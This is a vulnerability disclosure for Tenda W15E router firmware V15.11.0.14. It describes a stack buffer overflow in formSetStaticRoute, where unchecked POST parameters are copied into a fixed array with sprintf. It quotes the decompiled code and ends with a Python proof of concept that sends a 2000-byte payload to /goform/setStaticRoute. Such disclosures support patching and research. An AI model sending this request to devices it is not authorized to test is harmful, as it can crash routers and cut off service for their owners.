## Overview

- Firmware download website: https://www.tendacn.com/download/detail-2722.html

## Affected version

W15EV1.0 V15.11.0.14

## Vulnerability details

The Tenda W15EV1.0 V15.11.0.14 firmware has a stack overflow vulnerability in the `formSetStaticRoute` function. The `pRouteIndex` variable receives the `staticRouteIndex` parameter from a POST request and we let `iRouteIndex + 1 <= 10`. However, since the user can control the input of `staticRouteNet, staticRouteMask, staticRouteGateway, staticRouteWAN `, the statement

```c
net = websGetVar(wp, "staticRouteNet", byte_C3054);
mask = websGetVar(wp, "staticRouteMask", byte_C3054);
gateway = websGetVar(wp, "staticRouteGateway", byte_C3054);
wan = websGetVar(wp, "staticRouteWAN", byte_C3054);
// ...
sprintf((char *)sMibValue, "%s;%s;%s;%d;WAN0", (const char *)net, (const char *)mask, (const char *)gateway, iWanid);
sprintf((char *)sMibName, "adv.staticroute.list%d", iRouteIndex + 1);
```

can cause a buffer overflow. The user-provided `staticRouteNet, staticRouteMask, staticRouteGateway, staticRouteWAN` can exceed the capacity of the `sMibValue` array, triggering this security vulnerability.

![image-20240417103742378](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417103742378.png)

![image-20240417103724658](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417103724658.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setStaticRoute"
payload = b"a"*2000

data = {
        'staticRouteIndex': 1,
    	'staticRouteNet':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
